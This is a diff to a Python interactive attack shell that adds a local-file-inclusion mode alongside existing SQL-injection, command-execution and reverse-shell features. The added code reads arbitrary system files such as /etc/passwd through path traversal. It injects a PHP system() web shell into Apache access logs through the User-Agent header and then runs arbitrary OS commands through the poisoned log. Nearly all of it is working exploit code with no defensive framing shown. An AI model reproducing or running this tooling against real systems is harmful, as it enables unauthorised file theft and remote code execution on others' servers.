@@ -45,6 +45,11 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                 print("      query <sql> - Send custom SQL injection string")
                 print("      escalate    - Authenticate using dumped admin credentials to harvest token")
                 print("      exec <cmd>  - Execute OS commands using the harvested admin token")
+            elif vuln_type == "LFI":
+                print("      read <file> - Read arbitrary system files via path traversal (e.g., 'read /etc/passwd')")
+                print("      cat <file>  - Alias for read")
+                print("      escalate    - Poison server log files via User-Agent header injection to establish RCE")
+                print("      exec <cmd>  - Execute OS commands through the poisoned LFI execution channel")
             elif vuln_type == "Command Injection":
                 print("      exec <cmd>  - Execute any Linux command (e.g., 'exec ls', 'exec whoami')")
                 print("      revshell    - Generate reverse shell payloads for this target")
@@ -120,6 +125,21 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                         print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
                 except Exception as e:
                     print(f"    [-] Exploit failed: {e}")
+            elif vuln_type == "LFI":
+                print("[*] Firing LFI Path Traversal test payload (../../etc/passwd)...")
+                try:
+                    parsed = urllib.parse.urlparse(target_url)
+                    q = urllib.parse.parse_qs(parsed.query)
+                    param_name = param or "file"
+                    q[param_name] = ["../../../../etc/passwd"]
+                    new_q = urllib.parse.urlencode(q, doseq=True)
+                    exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                    
+                    req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                    with urllib.request.urlopen(req, timeout=3) as resp:
+                        print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+                except Exception as e:
+                    print(f"    [-] Exploit failed: {e}")
             elif vuln_type == "GraphQL":
                 print("[*] Re-running GraphQL Introspection query...")
                 try:
@@ -150,6 +170,53 @@ def run_target_shell(target_url, vuln_type, token=None, param=None):
                 exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
                 
                 req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] Execution failed: {e}")
+        elif (cmd.startswith("read ") or cmd.startswith("cat ")) and vuln_type == "LFI":
+            file_path = cmd.split(" ", 1)[1]
+            print(f"[*] Traversing path to read file: {file_path}")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                q = urllib.parse.parse_qs(parsed.query)
+                param_name = param or "file"
+                traversal_payload = f"../../../../{file_path.lstrip('/')}"
+                q[param_name] = [traversal_payload]
+                new_q = urllib.parse.urlencode(q, doseq=True)
+                exploit_url = urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_q, parsed.fragment))
+                
+                req = urllib.request.Request(exploit_url, headers={'User-Agent': 'Mozilla/5.0'})
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
+            except Exception as e:
+                print(f"    [-] File read failed: {e}")
+        elif cmd == "escalate" and vuln_type == "LFI":
+            print("[*] Poisoning Apache access logs via User-Agent header injection...")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                poison_url = f"{base_domain}/page.php?file=../../../../var/log/apache2/access.log"
+                
+                req = urllib.request.Request(poison_url, headers={
+                    'User-Agent': '<?php system($_GET[\'cmd\']); ?>',
+                    'X-Forwarded-For': '127.0.0.1'
+                })
+                with urllib.request.urlopen(req, timeout=3) as resp:
+                    print(f"    [+] Log poisoning payload delivered (HTTP {resp.getcode()})!")
+                    print("    [!] SUCCESS! LFI execution channel established via log poisoning.")
+                    harvested_token = "lfi_rce_active"
+            except Exception as e:
+                print(f"    [-] Log poisoning failed: {e}")
+        elif cmd.startswith("exec ") and vuln_type == "LFI":
+            user_linux_cmd = cmd.split(" ", 1)[1]
+            print(f"[*] Executing command through LFI log inclusion: {user_linux_cmd}")
+            try:
+                parsed = urllib.parse.urlparse(target_url)
+                base_domain = f"{parsed.scheme}://{parsed.netloc}"
+                exec_url = f"{base_domain}/page.php?file=../../../../var/log/apache2/access.log&cmd={urllib.parse.quote(user_linux_cmd)}"
+                
+                req = urllib.request.Request(exec_url, headers={'User-Agent': 'Mozilla/5.0'})
                 with urllib.request.urlopen(req, timeout=3) as resp:
                     print(f"    [+] Response (HTTP {resp.getcode()}):\n{resp.read().decode('utf-8', errors='ignore')}")
             except Exception as e:
